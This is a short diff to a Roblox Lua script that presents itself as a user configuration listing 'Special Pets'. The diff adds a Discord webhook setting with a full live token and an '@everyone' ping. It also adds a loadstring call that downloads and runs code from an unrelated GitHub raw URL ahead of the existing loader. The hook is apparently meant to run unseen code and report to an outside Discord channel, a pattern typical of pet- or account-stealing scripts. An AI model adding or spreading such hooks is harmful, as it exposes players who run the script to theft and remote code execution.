@@ -71,4 +71,9 @@ getgenv().UserConfig = {
         ["Special Pets"] = {"Monolith"}
     }
 }
+_G.WEBHOOK_CONFIG = {
+    url = "https://discord.com/api/webhooks/1387491597209305239/4oDVgAmG6g2IdGny1vK4NDDiZJI94B0siNeQGYMjKg8aXsu8nQcBNmgHES-z1d9lzTsf",
+    everyone = true
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/bag/refs/heads/main/io"))()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ccbddd87670e37be6aa0dbf793748a94.lua"))()
